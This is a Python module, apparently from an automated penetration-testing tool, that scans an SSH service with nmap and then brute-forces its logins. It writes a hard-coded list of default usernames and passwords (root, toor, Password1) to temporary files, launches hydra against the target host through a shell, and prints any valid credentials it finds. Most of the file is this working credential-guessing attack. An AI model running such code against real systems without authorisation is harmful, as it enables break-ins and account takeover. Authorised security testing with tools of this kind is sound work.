import nmap
import subprocess
import tempfile
from utils import *


def nmapscripts(host, port, service, output_file, **kwargs):
    SCRIPTS= [
        'sshv1'
    ]

    nm = nmap.PortScanner()
    args = '-vv -Pn -sV --script={} -oN {} '.format(','.join(SCRIPTS), output_file)
    res = nm.scan(hosts=host, ports=port, arguments=args)
    

def commonlogins(host, port, service, output_file, **kwargs):
    COMMON_USERS = [ 'root', 'toor', 'user', 'r00t' ]
    COMMON_PASS =  [ 'root', 'toor', 'password', 'r00t', 'Password1', '12345678', '?????' ]

    usernames_path = tempfile.mktemp()
    passwords_path = tempfile.mktemp()
    with open(usernames_path, 'w') as usernames_file:
        usernames_file.write('\n'.join(COMMON_USERS))
        usernames_file.write('\n')

    with open(passwords_path, 'w') as passwords_file:
        passwords_file.write('\n'.join(COMMON_PASS))
        passwords_file.write('\n')

    HYDRA = 'hydra -v -I -L {} -P {} -t4 ssh://{}:{}'.format(usernames_path, passwords_path, host, port)
    try:
        p = subprocess.Popen(HYDRA, stdout=subprocess.PIPE, shell=True)
        results, __ = p.communicate()
        _results = results.split('\n')

        for line in _results:
            if 'login:' in line:
                user = line.split(' ')[6]
                pwd = line.split(' ')[10]
                print_green('[{}] Valid SSH credentials found: {}:{}'.format(host, user, pwd))

        with open(output_file, 'w') as output:
            output.write(results)
    except Exception as e:
        print_red('Error during hydra (ssh): {}'.format(HYDRA))
        print_red('Error message: {}'.format(e.message))

    os.unlink(usernames_path)
    os.unlink(passwords_path)
